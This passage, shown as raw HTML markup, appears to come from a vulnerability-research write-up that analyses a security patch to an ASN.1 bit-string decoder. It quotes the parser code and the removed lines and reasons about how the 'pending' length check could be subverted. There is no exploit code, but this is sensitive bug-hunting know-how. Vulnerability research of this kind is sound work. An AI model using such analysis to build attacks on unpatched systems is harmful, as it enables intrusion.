&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;2&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;top&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c23"&gt;/* This element is larger than its enclosing element, which is&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c23"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* invalid. */&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;return&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;while&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;((&lt;/span&gt;&lt;span class="c3"&gt;parent &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;sec_asn1d_get_enclosing_construct&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;parent&lt;/span&gt;&lt;span class="c1"&gt;))&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;parent&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;indefinite&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;It first walks up the state stack to find the innermost constructed definite state and uses its &lt;/span&gt;&lt;span class="c7"&gt;state-&amp;gt;pending&lt;/span&gt;&lt;span&gt;&amp;nbsp;value as an upper bound. It then walks the state stack again and for each in-between state subtracts from that original value of &lt;/span&gt;&lt;span class="c7"&gt;pending&lt;/span&gt;&lt;span&gt;&amp;nbsp;how many bytes could have been consumed by those in between states. It&amp;#39;s pretty clear that the &lt;/span&gt;&lt;span class="c7"&gt;pending&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;value is therefore vitally important; it&amp;#39;s used to determine an upper bound so if we could mess with it this &amp;quot;bounds check&amp;quot; could go wrong.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c9"&gt;After figuring out that this was pretty clearly the only place where any kind of bounds checking takes place I looked back at the fix more closely.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;We know that &lt;/span&gt;&lt;span class="c7"&gt;sec_asn1d_parse_bit_string&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;is only the function which changed:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.42f4c91c05b2a51603f4110e33201853c8d03da3"&gt;&lt;/a&gt;&lt;a id="t.11"&gt;&lt;/a&gt;&lt;table class="c25"&gt;&lt;tbody&gt;&lt;tr class="c18"&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c6"&gt;&lt;span class="c16"&gt;static&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;unsigned&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;long&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;sec_asn1d_parse_bit_string &lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;sec_asn1d_state &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;const&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;char&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;buf&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;unsigned&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;long&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;unsigned&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;char&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;byte&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c23"&gt;/*PORT_Assert (state-&amp;gt;pending &amp;gt; 0); */&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; PORT_Assert &lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;place &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;beforeBitString&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c14"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;((&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;pending &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c12"&gt;||&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c12"&gt;(&lt;/span&gt;&lt;span class="c3 c12"&gt;state&lt;/span&gt;&lt;span class="c1 c12"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c12"&gt;contents_length &lt;/span&gt;&lt;span class="c1 c12"&gt;==&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11 c12"&gt;1&lt;/span&gt;&lt;span class="c1 c12"&gt;)&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;dest &lt;/span&gt;&lt;span class="c1"&gt;!=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c20"&gt;SecAsn1Item&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;item &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c20"&gt;SecAsn1Item&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*)(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;dest&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; item&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c20"&gt;Data&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; item&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c20"&gt;Length&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;place &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;beforeEndOfContents&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3 c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16 c12"&gt;if&lt;/span&gt;&lt;span class="c1 c12"&gt;(&lt;/span&gt;&lt;span class="c3 c12"&gt;state&lt;/span&gt;&lt;span class="c1 c12"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c12"&gt;contents_length &lt;/span&gt;&lt;span class="c1 c12"&gt;==&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11 c12"&gt;1&lt;/span&gt;&lt;span class="c1 c12"&gt;)&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c12"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3 c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c23 c12"&gt;/* skip over (unused) remainder byte */&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3 c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c12 c16"&gt;return&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11 c12"&gt;1&lt;/span&gt;&lt;span class="c1 c12"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3 c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1 c12"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3 c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16 c12"&gt;else&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c12"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3 c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16 c12"&gt;return&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11 c12"&gt;0&lt;/span&gt;&lt;span class="c1 c12"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3 c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1 c12"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;len &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;top&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;status &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;needBytes&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;return&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;byte&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c16"&gt;unsigned&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;char&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;buf&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c16"&gt;byte&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;7&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; dprintf&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c22"&gt;&amp;quot;decodeError: parse_bit_string remainder oflow\n&amp;quot;&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; PORT_SetError &lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;SEC_ERROR_BAD_DER&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;top&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;status &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;decodeError&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;return&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;bit_string_unused_bits &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;byte&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;place &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;duringBitString&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;pending &lt;/span&gt;&lt;span class="c1"&gt;-=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;return&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;The highlighted region of the function are the characters which were removed by the patch. This function is meant to return the number of input bytes (pointed to by &lt;/span&gt;&lt;span class="c7"&gt;buf&lt;/span&gt;&lt;span&gt;) which it consumed and my initial hunch was to notice that the patch removed a path through this function where you could get the count of input bytes consumed and &lt;/span&gt;&lt;span class="c30"&gt;pending&lt;/span&gt;&lt;span&gt;&amp;nbsp;out-of-sync. It should be the case that when they return 1 in the removed code they also decrement &lt;/span&gt;&lt;span class="c30"&gt;state-&amp;gt;pending&lt;/span&gt;&lt;span class="c9"&gt;, as they do in the other place where this function returns 1.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c9"&gt;I spent quite a while trying to figure out how you could actually turn that into something useful but in the end I don&amp;#39;t think you can.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c9"&gt;So what else is going on here?&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;This state is reached with &lt;/span&gt;&lt;span class="c7"&gt;buf&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointing to the first byte after the length value of a primitive bitstring. &lt;/span&gt;&lt;span class="c7"&gt;state-&amp;gt;contents_length&lt;/span&gt;&lt;span&gt;&amp;nbsp;is the value of that parsed length. Bitstrings, as discussed earlier, are a unique ASN.1 string type in that they have an extra meta-data byte at the beginning (the unused-bits count byte.) It&amp;#39;s perfectly fine to have a definite zero-length string - indeed that&amp;#39;s (sort-of) handled earlier than this in the &lt;/span&gt;&lt;span class="c7"&gt;prepareForContents&lt;/span&gt;&lt;span&gt;&amp;nbsp;state, which short-circuits straight to &lt;/span&gt;&lt;span class="c7"&gt;afterEndOfContents&lt;/span&gt;&lt;span class="c9"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.f2043ae4749f0304b8055ed271eca98bdb5b783d"&gt;&lt;/a&gt;&lt;a id="t.12"&gt;&lt;/a&gt;&lt;table class="c25"&gt;&lt;tbody&gt;&lt;tr class="c18"&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c6"&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;contents_length &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(!&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;indefinite&lt;/span&gt;&lt;span class="c1"&gt;))&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c23"&gt;/*&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c23"&gt;&amp;nbsp; &amp;nbsp;* A zero-length simple or constructed string; we are done.&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c23"&gt;&amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;place &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;afterEndOfContents&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 